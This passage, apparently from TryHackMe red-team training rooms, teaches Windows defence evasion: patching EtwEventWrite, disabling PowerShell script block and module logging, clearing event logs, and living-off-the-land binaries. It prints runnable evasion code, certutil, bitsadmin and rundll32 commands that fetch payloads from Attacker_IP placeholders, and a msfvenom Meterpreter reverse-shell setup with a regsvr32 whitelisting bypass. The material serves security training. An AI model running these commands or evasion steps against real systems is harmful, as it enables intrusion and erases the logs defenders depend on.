 observing the function, we are looking for an opcode that will return 
the function or stop the execution of the function. Through research or 
familiarity with assembly instructions, we can determine that `ret 14h` will end the function and return to the previous application.

From [IA-32 documentation](https://docs.oracle.com/cd/E19455-01/806-3773/instructionset-67/index.html), “the *ret* instruction transfers control to the return address located on the stack.”

In more technical terms, ret will *pop* the last value placed on the stack. The parameter of ret (`14h`) will specify the number of bytes or words released once the stack is popped.

To neuter the function, an attacker can write the opcode bytes of `ret14h`, `c21400` to memory to patch the function.

To better understand what we are attempting to achieve on the stack we can apply the opcode to our previous LIFO diagram.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/52fd846d5fa1e76948ac47d563ad6228.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/52fd846d5fa1e76948ac47d563ad6228.png)

*Figure 2.*

Now that we have a basic understanding of the core fundamentals behind the technique let's look at how it’s technically applied.

At a high level, ETW patching can be broken up into five steps:

1. Obtain a handle for `EtwEventWrite`
2. Modify memory permissions of the function
3. Write opcode bytes to memory
4. Reset memory permissions of the function (optional)
5. Flush the instruction cache (optional)

At step one, we need to obtain a handle for the address of `EtwEventWrite`. This function is stored within `ntdll`. We will first load the library using `LoadLibrary` then obtain the handle using `GetProcAddress`.

```csharp
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");

```

At
 step two, we need to modify the memory permissions of the function to 
allow us to write to the function. The permission of the function is 
defined by the `flNewProtect` parameter; `0x40` enables X, R, or RW access ([memory protection constraints](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)).

```csharp
uint oldProtect;
Win32.VirtualProtect(
	etwFunction,
	(UIntPtr)patch.Length,
	0x40,
	out oldProtect
);

```

At
 step three, the function has the permissions we need to write to it, 
and we have the pre-defined opcode to patch it. Because we are writing 
to a function and not a process, we can use the infamous `Marshal.Copy` to write our opcode.

```csharp
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch,
	0,
	etwEventSend,
	patch.Length
);

```

At step four, we can begin cleaning our steps to restore memory permissions as they were.

```csharp
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);

```

At step five, we can ensure the patched function will be executed from the instruction cache.

```csharp
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);

```

We
 can compile these steps together and append them to a malicious script 
or session. Use the C# script provided and experiment with this 
technique.

After the opcode is written to memory, we can view the disassembled function again to observe the patch.

```wasm
779f23c0 c21400		    ret	14h
779f23c3 00ec		      add	ah, ch
779f23c5 83e4f8		    and	esp, 0FFFFFFF8h
779f23c8 81ece0000000	sub	esp, 0E0h

```

In the above disassembly, we see exactly what we depicted in our LIFO diagram (*figure 2*).

Once the function is patched in memory, it will always return when `EtwEventWrite` is called.

Although this is a beautifully crafted technique, it might not be
 the best approach depending on your environment since it may restrict 
more logs than you want for integrity.

**Providers via Policy**

ETW has a lot of 
coverage out of the box, but it will disable some features unless 
specified because of the amount of logs they can create. These features 
can be enabled by modifying the **GPO** (**G**roup **P**olicy **O**bject) settings of their parent policy.  Two of the most popular GPO providers provide coverage over PowerShell, including **script block logging** and **module logging**.

Script block logging will log any script blocks executed within a PowerShell session. Introduced in PowerShell v4 and improved in PowerShell v5, the ETW provider has two event IDs it will report.

| **Event ID** | **Purpose** |
| --- | --- |
| 4103 | Logs command invocation |
| 4104 | Logs script block execution |

Event ID 4104 is most prevalent to attackers and can expose their 
scripts if not properly obfuscated or hidden. Below is a shortened 
example of what a 4104 log may look like.

```xml
Event ID:4104
Source:Microsoft-Windows-PowerShell
Category:Execute a Remote Command
Log:Microsoft-Windows-PowerShell/Operational
Message:Creating Scriptblock text (1 of 1):
Write-Host PowerShellV5ScriptBlockLogging

ScriptBlock ID: 6d90e0bb-e381-4834-8fe2-5e076ad267b3
Path:

```

Module logging is a very verbose provider that will log any modules and data sent from it. Introduced in PowerShell
 v3, each module within a PowerShell session acts as a provider and logs
 its own module. Similar to the previous provider, the modules will 
write events to event ID 4103. Below is an example of what a 4103 log 
may look like.

```xml
Event ID:4103
Source:Microsoft-Windows-PowerShell
Category:Executing Pipeline
Log:Microsoft-Windows-PowerShell/Operational

Message:CommandInvocation(Write-Host): "Write-Host"
ParameterBinding(Write-Host): name="Object";
value="TestPowerShellV5"

Context:
Severity = Informational
Host Name = ConsoleHost
...
[snip]
...
User = DOMAIN\\username
Connected User =
Shell ID = Microsoft.PowerShell

```

Event ID 4103 is less prevalent to attackers because of the amount of
 logs created. This can often result in it being treated with less 
severity or being disabled completely.

Although attackers have ETW patches available, they may not always be
 practical or the best approach to evade logging. As an alternative, 
attackers can target these providers to slowly limit visibility while 
not being as obvious or noisy as other techniques.

The general goal of disabling these providers is to limit the 
visibility of components you require while still making the environment 
seem untampered.

**Group Policy Takeover**

The module logging and script block logging providers are both enabled from a group policy, specifically `Administrative Templates -> Windows Components -> Windows PowerShell`. As mentioned in task 4, Within a PowerShell
 session, system assemblies are loaded in the same security context as 
users. This means an attacker has the same privilege level as the 
assemblies that cache GPO settings. Using reflection, an attacker can 
obtain the utility dictionary and modify the group policy for either 
PowerShell provider.

At a high-level a group policy takeover can be broken up into three steps:

1. Obtain group policy settings from the utility cache.
2. Modify generic provider to `0`.
3. Modify the invocation or module definition.

We will break down an example PowerShell script to identify each step and explain each in depth below.

At step one, we must use reflection to obtain the type of `System.Management.Automation.Utils` and identify the GPO cache field: `cachedGroupPolicySettings`.

```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

```

At step two, we can leverage the GPO variable to modify either event provider setting to `0`. `EnableScriptBlockLogging` will control **4104**
 events, limiting the visibility of script execution. Modification can 
be accomplished by writing to the object or registry directly.

```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0

```

At step three, we can repeat the previous step with any other provider settings we want to `EnableScriptBlockInvocationLogging` will control **4103** events, limiting the visibility of cmdlet and pipeline execution.

```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0

```

We can compile these steps together and append them to a malicious PowerShell script. Use the PowerShell script provided and experiment with this technique.

Note: The core functionality of the script is identical to the above code but slightly modified to comply with PowerShell v.5.1 updates.

To prove the efficacy of the script, we can execute it and measure the number of returned events from a given command.

Before

```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
0
PS C:\Users\Administrator\Desktop> whoami
Tryhackme\administrator
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
3
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/67a61f5e3f05f5ce34c457509712adba.PNG](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/67a61f5e3f05f5ce34c457509712adba.PNG)

After

```powershell
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'

   ProviderName: Microsoft-Windows-Sysmon

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
1/5/2021 2:21:32 AM              3 Information      Network connection detected:...
```

In the first terminal, we see there are three events generated when the PowerShell
 script is run. In the second terminal, after the script is executed we 
see that there are no events generated from running a command.

**Abusing Log Pipeline**

Within PowerShell, each module or snap-in has a setting that anyone can use to modify its logging functionality. From the [Microsoft docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events), “When the *LogPipelineExecutionDetails* property value is TRUE (`$true`), Windows PowerShell
 writes cmdlet and function execution events in the session to the 
Windows PowerShell log in Event Viewer.” An attacker can change this 
value to `$false` in any PowerShell
 session to disable a module logging for that specific session. The 
Microsoft docs even note the ability to disable logging from a user 
session, “To disable logging, use the same command sequence to set the 
property value to FALSE (`$false`).”

At a high-level the log pipeline technique can be broken up into four steps:

1. Obtain the target module.
2. Set module execution details to `$false`.
3. Obtain the module snap-in.
4. Set snap-in execution details to `$false`.

```powershell
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false

```

The script block above can be appended to any PowerShell script or run in a session to disable module logging of currently imported modules.

**Real World Scenario**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2c05455a55ed2fcde589b34e918518cd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2c05455a55ed2fcde589b34e918518cd.png)

In
 this scenario, you are a red team operator assigned to build an evasive
 script to disable ETW and execute a compiled binary. In this scenario, 
environment integrity is crucial, and the blue team is actively 
monitoring the environment. Your team has informed you that they are 
primarily concerned with monitoring web traffic; if halted, they will 
potentially alert your connection. The blue team is also assumed to be 
searching for suspicious logs; however, they are not forwarding logs. 
Using the knowledge gained in this room, create a script to execute a 
binary or command without interference.

***Solution Walkthrough (Click to read)*

To
 begin this scenario we need to consider the environment that we are in.
 We are given the information that they are monitoring web traffic, but 
how are they accomplishing that? Do they have PowerShell
 logging enabled? Do they have Sysmon installed? Most of these questions
 can be answered through manual enumeration or looking for the settings 
to enable features as discussed in this room.
With some enumeration, we can identify that PowerShell
 script block and module logging are enabled. Our best approach to this 
problem is to disable both GPO settings from the cache for our 
PowerShell session. This can be accomplished by using the GPO bypass 
located on the desktop as discussed in Task 8.
Great! From now on our session is silent, but what about those 
pesky logs that are generated when the script ran? From the information 
provided we know that logs are not being forwarded so we can delete any 
4104 or 4103 logs that were generated. Because the internet connection 
is not originating from PowerShell we don't need to worry about it being disturbed in our silent session. To remove the logs, we can use the *Event Viewer* GUI or *Remove-EventLog* in PowerShell. PowerShell script block logs are located in *Microsoft/Windows/PowerShell/Operational* or *Microsoft-Windows-PowerShell.* You can then select *Clear Log* under actions in the GUI or run the PowerShell cmdlet to remove the necessary logs. 
At this point, we should have all the parameters met:
• Disable logging where needed
• Maintain environment integrity
• Clean our tracks
Now we can test our methodology by running the binary "agent.exe". If
 properly implemented a flag will be returned to the desktop.  If not properly implemented, *"Binary leaked, you got caught"* will appear, meaning that the binary appeared in the logs at some point, and you failed the scenario.**

## **LIVING OFF THE LAND**

**Windows Sysinternals**

# What is Windows Sysinternals?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/2f03b08c289de324bf0aaf3ae1271ccd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/2f03b08c289de324bf0aaf3ae1271ccd.png)

Windows
 Sysinternals is a set of tools and advanced system utilities developed 
to help IT professionals manage, troubleshoot, and diagnose the Windows 
operating system in various advanced topics.

Sysinternals Suite is divided into various categories, including:

- Disk management
- Process management
- Networking tools
- System information
- Security tools

In
 order to use the Windows Sysinternals tools, we need to accept the 
Microsoft license agreement of these tools. We can do this by passing 
the -accepteula argument at the command prompt or by GUI during tool execution.

The following are some popular Windows Sysinternals tools:

| [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) | Helps system administrators check specified access for files, directories, Registry keys, global objects, and Windows services. |
| --- | --- |
| [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) | A tool that executes programs on a remote system. |
| [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | An advanced Active Directory tool that helps to easily view and manage the AD database. |
| [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) | Monitors running processes for CPU spikes and the ability to dump memory for further analysis. |
| [ProcMon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) | An essential tool for process monitoring. |
| [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) | A tool that lists all TCP and UDP connections. |
| [PsTools](https://docs.microsoft.com/en-us/sysinternals/downloads/pstools) | The first tool designed in the Sysinternals suite to help list detailed information. |
| [Portmon](https://docs.microsoft.com/en-us/sysinternals/downloads/portmon) | Monitors and displays all serial and parallel port activity on a system. |
| [Whois](https://docs.microsoft.com/en-us/sysinternals/downloads/whois) | Provides information for a specified domain name or IP address. |

For more information about the Sysinternals suite, you can visit the tools' web page on Microsoft Docs [here](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite).

# Sysinternals Live

One of the great features of Windows Sysinternals is that there is no installation required.
 Microsoft provides a Windows Sysinternals service, Sysinternals live, 
with various ways to use and execute the tools. We can access and use 
them through:

- Web browser ([link](https://live.sysinternals.com/)).
- Windows Share
- Command prompt

In order to use these tools, you either download them or by entering the Sysinternal Live path \\live.sysinternals.com\tools into Windows Explorer.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/75af3683c5d9263c66c2ca4a9cb23a6f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/75af3683c5d9263c66c2ca4a9cb23a6f.png)

Note that since the attached VM does not have internet access, we pre-downloaded the Sysinternal tools in C:\Tools\.

Command Prompt

```
C:\Users\thm> C:\Tools\SysinternalsSuite\PsExec64.exe
```

If you are interested in learning more about Windows Sysinternals, we suggest to familiarize yourself with the following additional resources:

1. TryHackMe room: [Sysinternals](https://tryhackme.com/room/btsysinternalssg).
2. Microsoft Sysinternals Resources [website](https://docs.microsoft.com/en-us/sysinternals/resources/).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/e983e3743e86872540374d33a13cfb7b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/e983e3743e86872540374d33a13cfb7b.png)

# Red Team utilization and benefits

built-in
 and Sysinternals tools are helpful for system administrators, these 
tools are also used by hackers, malware, and pentesters due to the 
inherent trust they have within the operating system. This trust is 
beneficial to Red teamers, who do not want to get detected or caught by 
any security control on the target system. Therefore, these tools have 
been used to evade detection and other blue team controls.

Remember
 that due to the increase of adversaries and malware creators using 
these tools nowadays, the blue team is aware of the malicious usage and 
has implemented defensive controls against most of them.

**LOLBAS Project**

# What is LOLBAS?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa5cd3489ac1c2a6c315d637bf4ba8ce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa5cd3489ac1c2a6c315d637bf4ba8ce.png)

LOLBAS stands for **L**iving **O**ff the **L**and **B**inaries **A**nd **S**cripts,
 a project's primary main goal is to gather and document the 
Microsoft-signed and built-in tools used as  Living Off the Land 
techniques, including binaries, scripts, and libraries.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c98596d3c51c192ae9fd415ff06fc6b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c98596d3c51c192ae9fd415ff06fc6b9.png)

The LOLBAS project is a community-driven repository gathering a 
collection of binaries, scripts, libraries that could be used for red 
team purposes. It allows to search based on binaries, functions, 
scripts, and ATT&CK info. The previous image shows what the LOLBAS 
project page looks like at this time. If you are interested in more 
details about the project, you may visit the project's website

[here](https://lolbas-project.github.io/)

.

The
 LOLBAS website provides a convenient search bar to query all available 
data. It is straightforward to look for a binary; including the binary 
name will show the result. However, if we want to look for a specific 
function, we require providing a / before the function name. For example, if we are looking for all execute functions, we should use /execute. Similarly, in order to look based on types, we should use the # symbol followed by the type name. The following are the types included in the project:

- Script
- Binary
- Libraries
- OtherMSBinaries

# Tools Criteria

Specific criteria are required for a tool to be a "Living Off the Land" technique and accepted as part of the LOLBAS project:

- Microsoft-signed file native to the OS or downloaded from Microsoft.
- Having additional interesting unintended functionality not covered by known use cases.
- Benefits an APT (Advanced Persistent Threat) or Red Team engagement.

Please
 note that if you find an exciting binary that adheres to the previously
 mentioned criteria, you may submit your finding by visiting the [GitHub repo contribution page](https://github.com/LOLBAS-Project/LOLBAS#criteria) for more information.

# Interesting Functionalities

The LOLBAS project accepts tool submissions that fit one of the following functionalities:

- Arbitrary code execution
- File operations, including downloading, uploading, and copying files.
- Compiling code
- Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.
- UAC bypass
- Dumping process memory
- DLL injection

**File Operations**

This task shows 
commonly used tools based on functionalities and malware activities seen
 in the real world as well as in the red team engagements.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/aa1be26f2bc06a324dc5debb1dab5dec.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/aa1be26f2bc06a324dc5debb1dab5dec.png)

This
 task will highlight some interesting "Living Off the Land" techniques 
that aim to be used in a file operation, including download, upload, and
 encoding.

# Certutil

Certutil
 is a Windows built-in utility for handling certification services. It 
is used to dump and display Certification Authority (CA) configuration 
information and other CA components. Therefore, the tool's normal use is
 to retrieve certificate information. However, people found that 
certutil.exe could transfer and encode files unrelated to certification 
services. The MITRE ATT&CK framework identifies this technique as **Ingress tool transfer** ([T1105](https://attack.mitre.org/techniques/T1105/)).

To illustrate this with an example, we can use certutil.exe to download a file from an attacker's web server and store it in the Window's temporary folder, using the command below. Note that we use the-urlcache and -split -f parameters to enforce the tool to download from the provided URL using the split technique.

Command Prompt

```
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
```

- urlcache to display URL, enables the URL option to use in the commandsplit -f to split and force fetching files from the provided URL.

Also, the certutil.exe can be used as an encoding tool where we can encode files and decode the content of files. ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/) refers to this technique to obfuscate files to make them difficult to discover or analyze.

Command Prompt

```
C:\Users\thm> certutil -encode payload.exe Encoded-payload.txt
```

For more information about the tool, you may visit the Microsoft Document here: [Microsoft Docs: CertUtil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

# BITSAdmin

The bitsadmin tool is a system administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress. [BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) is a low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers. Additional information about the bitsadmin tool can be found at [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin).

Attackers
 may abuse the BITS jobs to download and execute a malicious payload in a
 compromised machine. For more information about this technique, you may
 visit the ATT&CK [T1197](https://attack.mitre.org/techniques/T1197/) page.

Introduce the terminal container content (revisit)

Command Prompt

```
C:\Users\thm>bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```

/Transfer to use the transfer option

/Download we are specifying transfer using download type

/Priority we are setting the priority of the job to be running in the foreground

For more information about the bitsadmin parameters, you can visit the [Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer) of the tool.

# FindStr

[Findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) is
 a Microsoft built-in tool used to find text and string patterns in 
files. The findstr tool is useful in that helps users and system 
administrators to search within files or parsed output. For example, if 
we want to check whether port 8080 is open on our machine, then we can 
pipe the result of netstat to find that port as follows: netstat -an| findstr "445".

However, an unintended way was found by using findstr.exe to download remote files from SMB shared folders within the network as follows,

Command Prompt

```
C:\Users\thm>findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```

/V to print out the lines that don't contain the string provided.

dummystring the text to be searched for; in this case, we provide a string that must not be found in a file.

> c:\Windows\Temp\test.exe redirect the output to a file on the target machine.

Note that other tools can be used for the file operation. We suggest visiting the [LOLBAS](https://lolbas-project.github.io/) project to check them out.

**File Execution**

This
 task shows various ways of executing a binary within the operating 
system. The typical case of executing a binary involves various known 
methods such as using the command line cmd.exe or
 from the desktop. However, other ways exist to achieve payload 
execution by abusing other system binaries, of which one of the reasons 
is to hide or harden the payload's process. Based on the MITRE ATT&CK framework, this technique is called **Signed Binary Proxy Execution** or **Indirect Command Execution**,
 where the attacker leverages other system tools to spawn malicious 
payloads. This technique also helps to evade defensive controls.

# File Explorer

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7f1d844fc2d17f26e1f454e47d3ab937.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7f1d844fc2d17f26e1f454e47d3ab937.png)

File
 Explorer is a file manager and system component for Windows. People 
found that using the file explorer binary can execute other .exe files. This technique is called **Indirect Command Execution**, where the explorer.exe tool can be used and abused to launch malicious scripts or executables from a trusted parent process.

The explorer.exe binary is located at:

- C:\Windows\explorer.exe for the Windows 32 bits version
- C:\Windows\SysWOW64\explorer.exe for the Windows 64 bits version

In order to create a child process of explorer.exe parent, we can execute the following command:

Command Prompt

```
C:\Users\thm> explorer.exe /root,"C:\Windows\System32\calc.exe"
```

As a result of the previous command, we popped the calculator on the desktop.

# WMIC

Windows
 Management Instrumentation (WMIC) is a Windows command-line utility 
that manages Windows components. People found that WMIC is also used to 
execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution ([T1218](https://attack.mitre.org/techniques/T1218/))

Command Prompt

```
C:\Users\thm>wmic.exe process call create calc
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 1740;
        ReturnValue = 0;
};

C:\Users\thm>
```

The previous WMIC command creates a new process of a binary of our choice, which in this case calc.exe.

# Rundll32

Rundll32 is a Microsoft built-in tool that loads and runs Dynamic Link Library DLL files within the operating system. A red team can abuse and leverage rundll32.exe to run arbitrary payloads and execute JavaScript and PowerShell scripts. The MITRE ATT&CK framework identifies this as **Signed Binary Proxy Execution: Rundll32** and refers to it as [T1218](https://attack.mitre.org/techniques/T1218/011/).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/8c486194a27568f2db0fd410cf82dbc6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/8c486194a27568f2db0fd410cf82dbc6.png)

The rundll32.exe binary is located at:

- C:\Windows\System32\rundll32.exe for the Windows 32 bits version
- C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version

Now let's try to execute a calc.exe binary as proof of concept using the rundll32.exe binary:

Command Prompt

```
C:\Users\thm> rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

In the previous command, we used the rundll32.exe binary that embeds a JavaScript component, eval(), to execute the calc.exe binary, a Microsoft calculator.

As we mentioned previously, we can also execute PowerShell scripts using the rundll32.exe. The following command runs a JavaScript that executes a PowerShell script to download from a remote website using rundll32.exe.

Command Prompt

```
C:\Users\thm> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```

As a result of the previous execution, a copy of the script.ps1 downloaded into memory on the target machine.

**Application Whitelisting Bypasses**

# Bypassing Application Whitelisting

Application
 Whitelisting is a Microsoft endpoint security feature that prevents 
malicious and unauthorized programs from executing in 
real-time. Application whitelisting is rule-based, where it specifies a 
list of approved applications or executable files that are allowed to be
 present and executed on an operating system. This task focuses on LOLBAS examples that are used to bypass the Windows application whitelisting.

# Regsvr32

Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs)  in the Windows Registry. The regsvr.exe binary is located at:

- C:\Windows\System32\regsvr32.exe for the Windows 32 bits version
- C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version

Besides its intended use, regsvr32.exe binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting. According to

[Red Canary](https://redcanary.com/)

reports, the regsvr32.exe binary is the third most popular

[ATT&CK technique](https://attack.mitre.org/techniques/T1218/010/)

. Adversaries leverage regsvr32.exe to execute native code or scripts locally or remotely. The technique used in the regsvr32.exe uses trusted Windows

OS

components and is executed in memory, which is one of the reasons why 
this technique is also used to bypass application whitelisting.

Let's try to apply this technique in real life. First, we need to create a malicious DLL file using msvenom and set up our  Metasploit
 listener to receive a reverse shell. Note that we will be creating a 
malicious file that works for 32bit operating systems. We will be using 
the regsvr32.exe Application Whitelisting Bypass technique to run a command on a target system.

Terminal

```
user@machine$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Final size of dll file: 8704 bytes

user@machine$ user@machine$ msfconsole -q msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ATTACKBOX_IP
LHOST => ATTACKBOX_IP
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on ATTACKBOX_IP:443
```

Note that we specified the output type as DLL using the-f argument. Once the malicious DLL
 file is generated, we need to deliver the payload to the victim 
machine. We will do this by using a webserver to serve the DLL file on 
our attacking machine as follows,

Terminal

```
user@machine$ python3 -m http.server 1337
```

From the victim machine, visit the webserver of the attacking machine on port 1337 that we specify. Note that this port can be changed with your choice!

On the victim machine, once the file DLL file is downloaded, we execute it using regsvr32.exe  as follows,

Command Prompt

```
C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
or
C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
```

With the second option, which is a more advanced command, we instruct the regsvr32.exe to run:

- /s: in silent mode (without showing messages)
- /n: to not call the DLL register server
- /i:: to use another server since we used /n
- /u: to run with unregister method

On the attacking machine, we should receive a reverse shell.

Terminal

```
msf6 > exploit(multi/handler) > exploit

[*] Started reverse TCP handler on ATTACKBOX_IP:443
[*] Sending stage (175174 bytes) to 10.10.159.197
[*] Meterpreter session 1 opened (ATTACKBOX_IP:443 -> 10.10.159.197:52845 ) at 2022-01-20 05:51:31 -0600
```

Note if we wanted to create a 64-bit DLL version, we need to specify it in the msfvenom command and run it from the victim machine using the 64bits version of regsvr32.exe at C:\Windows\SysWOW64\regsvr32.exe.

# Bourne Again Shell (Bash)

In 2016, Microsoft added support for the Linux environment on Windows 10,11, and Server 2019. This feature is known as Windows Subsystem for Linux ([WSL](https://docs.microsoft.com/en-us/windows/wsl/about)), and it exists in [two WSL versions](https://docs.microsoft.com/en-us/windows/wsl/compare-versions): WSL1 and WSL2. WSL is a Hyper-V virtualized Linux
 distribution that runs on the operating system, supporting a subset of 
the Linux kernel and system calls. This feature is an addon that a user 
can install and interact with a Linux distribution. As part of WSL, bash.exe is a Microsoft tool for interacting with the Linux environment.

People
 found ways to execute payloads and bypass the Windows application 
whitelisting since it is a Microsoft signed binary. By executing bash.exe -c "path-to-payload", we can execute any unsigned payload. ATT&CK called this an **Indirect Command execution** technique where
 attackers abuse the Windows tools utility to obtain command executions.
 For more information about this technique, you may visit the [T1202](https://attack.mitre.org/techniques/T1202/) ATT&CK website.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0468b54d6174a620d130adb1edacc1c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0468b54d6174a620d130adb1edacc1c.png)

Note that you need to enable and install the Windows Subsystem for Linux in Windows 10 to use the bash.exe binary. Also, the attached VM does not have the Linux Subsystem enabled due to nested virtualization restrictions.

Keep in mind that this section 
highlighted a couple of interesting tools. If you are interested in 
checking out the LOLBAS tools available, you may visit the [project website](https://lolbas-project.github.io/).

**Other Techniques**

This section highlights
 a couple of interesting techniques used, whether for initial access or 
persistence. The following techniques belong to the Living Off the Land 
umbrella since they can be used as part of the Windows environment 
utilities.

# Shortcuts

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b1b3be212430f23ddaba1f82f2c2a566.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b1b3be212430f23ddaba1f82f2c2a566.png)

Shortcuts
 or symbolic links are a technique used for referring to other files or 
applications within the operating system. Once a user clicks on the 
shortcut file, the reference file or application is executed. Often, the
 Red team leverages this technique to gain initial access, privilege 
escalation, or persistence. The MITRE ATT&CK framework calls this **Shortcut modification technique** [T1547](https://attack.mitre.org/techniques/T1547/009/), where an attacker creates or modifies a shortcut in order to take advantage of this technique.

To use the shortcut modification technique, we can set the target section to execute files using:

- Rundll32
- Powershell
- Regsvr32
- Executable on disk

The
 attached figure shows an example of a shortcut modification technique, 
where the attacker modified the Excel target section to execute a binary
 using rundll32.exe.
 We choose to execute a calculator instead of running the Excel 
